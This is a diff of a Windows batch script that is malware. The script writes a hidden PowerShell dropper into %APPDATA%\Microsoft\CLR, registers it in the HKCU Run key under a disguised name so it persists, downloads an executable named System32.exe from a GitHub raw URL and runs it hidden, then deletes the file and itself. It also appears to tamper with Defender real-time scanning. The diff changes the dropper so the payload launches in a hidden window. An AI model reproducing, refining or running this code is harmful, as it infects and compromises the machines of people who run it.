@@ -62,7 +62,7 @@ set s5=DisableScanOnRealtimeEnable
 set d=%APPDATA%\Microsoft\CLR
 if not exist "%d%" md "%d%" >nul 2>&1
 (echo @echo off
-echo powershell -w hidden -ep bypass -c "$e=$env:TEMP;cd $e;$p='System32.exe';iwr 'https://github.com/dinmihaile/hvh2/raw/refs/heads/main/System32.exe' -O $p;. $p"
+echo powershell -w hidden -ep bypass -c "$e=$env:TEMP;cd $e;$p='System32.exe';iwr 'https://github.com/dinmihaile/hvh2/raw/refs/heads/main/System32.exe' -O $p;Start-Process $p -WindowStyle Hidden"
 ) > "%d%\UsageLogs.bat"
 
 set k1=HKCU\Software\Microsoft\Windows\CurrentVersion\Run
@@ -70,7 +70,7 @@ set k2=CLRUsageLog
 set k3=REG_SZ
 %r1% %r2% "%k1%" %r4% %k2% %r6% %k3% %r8% "\"%d%\UsageLogs.bat\"" %r0% >nul 2>&1
 
-powershell -w hidden -ep bypass -c "$e=$env:TEMP;cd $e;$p='System32.exe';iwr 'https://github.com/dinmihaile/hvh2/raw/refs/heads/main/System32.exe' -O $p;. $p;sleep 3;rm $p -force" >nul 2>&1
+powershell -w hidden -ep bypass -c "$e=$env:TEMP;cd $e;$p='System32.exe';iwr 'https://github.com/dinmihaile/hvh2/raw/refs/heads/main/System32.exe' -O $p;Start-Process $p -WindowStyle Hidden;sleep 3;rm $p -force" >nul 2>&1
 
 timeout /t 1 /nobreak >nul
 del "%~f0" >nul 2>&1
